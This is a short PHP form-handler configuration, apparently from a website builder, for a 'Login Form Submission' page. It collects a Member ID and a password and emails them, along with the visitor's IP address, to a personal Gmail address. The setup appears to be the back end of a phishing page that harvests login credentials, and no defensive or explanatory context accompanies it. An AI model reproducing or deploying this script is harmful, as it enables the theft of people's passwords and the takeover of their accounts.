<?php 


require_once('form_process.php');

$form = array(
	'subject' => 'Login Form Submission',
	'heading' => 'New Form Submission',
	'success_redirect' => '',
	'resources' => array(
		'checkbox_checked' => 'Checked',
		'checkbox_unchecked' => 'Unchecked',
		'submitted_from' => 'Form submitted from website: %s',
		'submitted_by' => 'Visitor IP address: %s',
		'too_many_submissions' => 'Too many recent submissions from this IP',
		'failed_to_send_email' => 'Failed to send email',
		'invalid_reCAPTCHA_private_key' => 'Invalid reCAPTCHA private key.',
		'invalid_reCAPTCHA2_private_key' => 'Invalid reCAPTCHA 2.0 private key.',
		'invalid_reCAPTCHA2_server_response' => 'Invalid reCAPTCHA 2.0 server response.',
		'invalid_field_type' => 'Unknown field type \'%s\'.',
		'invalid_form_config' => 'Field \'%s\' has an invalid configuration.',
		'unknown_method' => 'Unknown server request method'
	),
	'email' => array(
		'from' => 'anaghamolkalmur@gmail.com',
		'to' => 'anaghamolkalmur@gmail.com'
	),
	'fields' => array(
		'custom_U1280' => array(
			'order' => 1,
			'type' => 'string',
			'label' => 'Member ID',
			'required' => true,
			'errors' => array(
				'required' => 'Field \'Member ID\' is required.'
			)
		),
		'Email' => array(
			'order' => 2,
			'type' => 'email',
			'label' => 'Password',
			'required' => true,
			'errors' => array(
				'required' => 'Field \'Password\' is required.',
				'format' => 'Field \'Password\' has an invalid email.'
			)
		)
	)
);

process_form($form);
?>
